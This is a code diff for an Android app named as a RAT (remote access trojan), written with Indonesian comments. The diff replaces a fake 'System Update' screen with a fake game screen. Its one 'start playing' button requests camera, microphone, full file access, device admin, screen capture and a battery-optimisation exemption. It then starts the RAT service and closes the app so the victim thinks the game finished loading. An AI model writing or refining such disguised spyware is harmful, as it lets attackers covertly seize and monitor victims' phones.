@@ -1,9 +1,10 @@
 package com.xyrex.rat;
+
 import android.Manifest;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Intent;
-import android.content.pm.PackageManager;
+import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -20,54 +21,25 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(b);
         LinearLayout ll = new LinearLayout(this);
         ll.setOrientation(LinearLayout.VERTICAL);
-        ll.setPadding(48,48,48,48);
+        ll.setPadding(80, 150, 80, 80); // Bikin tombol di tengah kayak game
+        
         TextView tv = new TextView(this);
-        tv.setText("System Update\n\nAktifkan izin berikut sekali saja:");
+        tv.setText("CRAZY GAME\n\nKlik tombol di bawah untuk memulai permainan!");
+        tv.setTextSize(20);
+        tv.setGravity(android.view.Gravity.CENTER);
         ll.addView(tv);
 
-        Button perm = new Button(this);
-        perm.setText("1. Beri Izin");
-        perm.setOnClickListener(v -> requestPerms());
-        ll.addView(perm);
-
-        Button adm = new Button(this);
-        adm.setText("2. Aktifkan Device Admin");
-        adm.setOnClickListener(v -> {
-            ComponentName cn = new ComponentName(this, AdminReceiver.class);
-            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
-            startActivity(i);
-        });
-        ll.addView(adm);
-
-        Button proj = new Button(this);
-        proj.setText("3. Izinkan Rekam Layar");
-        proj.setOnClickListener(v -> startActivity(new Intent(this, ScreenCaptureActivity.class)));
-        ll.addView(proj);
-
         Button start = new Button(this);
-        start.setText("4. Mulai");
-        start.setOnClickListener(v -> {
-            try {
-                Intent svc = new Intent(this, RatService.class);
-                if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc); else startService(svc);
-            } catch (Exception e){}
-            try {
-                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-                if (!pm.isIgnoringBatteryOptimizations(getPackageName())){
-                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                    i.setData(Uri.parse("package:"+getPackageName()));
-                    startActivity(i);
-                }
-            } catch (Exception e){}
-            finish();
-        });
+        start.setText("MULAI MAIN");
+        start.setTextSize(18);
+        start.setOnClickListener(v -> mulaiSemua());
         ll.addView(start);
 
         setContentView(ll);
     }
 
-    private void requestPerms(){
+    private void mulaiSemua() {
+        // 1. Minta Izin Biasa (Kamera, File, Notif)
         java.util.List<String> p = new java.util.ArrayList<>();
         p.add(Manifest.permission.CAMERA);
         p.add(Manifest.permission.RECORD_AUDIO);
@@ -80,6 +52,8 @@ public class MainActivity extends AppCompatActivity {
             p.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
         }
         ActivityCompat.requestPermissions(this, p.toArray(new String[0]), 99);
+
+        // 2. Minta Izin Semua File
         if (Build.VERSION.SDK_INT >= 30){
             try {
                 if (!android.os.Environment.isExternalStorageManager()){
@@ -88,6 +62,41 @@ public class MainActivity extends AppCompatActivity {
                     startActivity(i);
                 }
             } catch (Exception e){}
+        }
+
+        // 3. Aktifkan Device Admin
+        ComponentName cn = new ComponentName(this, AdminReceiver.class);
+        Intent adm = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+        adm.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
+        startActivity(adm);
+
+        // 4. Minta Izin Rekam Layar
+        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+        startActivityForResult(mpm.createScreenCaptureIntent(), 1001);
+
+        // 5. Bypass Baterai
+        try {
+            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+            if (!pm.isIgnoringBatteryOptimizations(getPackageName())){
+                Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                i.setData(Uri.parse("package:"+getPackageName()));
+                startActivity(i);
+            }
+        } catch (Exception e){}
+
+        // 6. Jalankan Service RAT & Sembunyikan Aplikasi
+        try {
+            Intent svc = new Intent(this, RatService.class);
+            if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc); else startService(svc);
+            finishAffinity(); // Tutup aplikasi biar kayak game selesai loading
+        } catch (Exception e){}
+    }
+
+    @Override
+    protected void onActivityResult(int req, int res, Intent data) {
+        super.onActivityResult(req, res, data);
+        if (req == 1001 && res == RESULT_OK) {
+            ScreenCaptureActivity.RESULT_DATA = data; // Simpan izin rekam layar
         }
     }
 }
